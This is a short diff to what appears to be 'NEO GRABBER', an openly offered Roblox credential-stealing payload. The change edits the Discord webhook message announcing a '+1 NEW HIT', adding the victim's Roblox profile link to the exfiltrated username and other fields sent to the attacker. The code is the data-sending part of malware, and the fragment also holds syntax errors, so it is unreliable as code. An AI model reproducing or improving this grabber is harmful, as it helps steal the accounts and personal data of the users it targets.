@@ -128,7 +128,7 @@ discord.post(
         {
             "username": "NEO GRABBER"
             "title": "🔥+1 NEW HIT!🔥"
-            "description" : f"[Source Code](https://github.com/TheGeekLucas/NEO-Grabber) | [Rolimons]({rolimons}) This is open source payload. You can edit it aswell.",
+            "description" : f"[Source Code](https://github.com/TheGeekLucas/NEO-Grabber) | [Roblox Profile]({roblox_profile}) | [Rolimons]({rolimons}) This is open source payload. You can edit it aswell.",
             "color" : 8819de,
             "fields": [
                 {"name": "Username", "value": username, "inline": True},
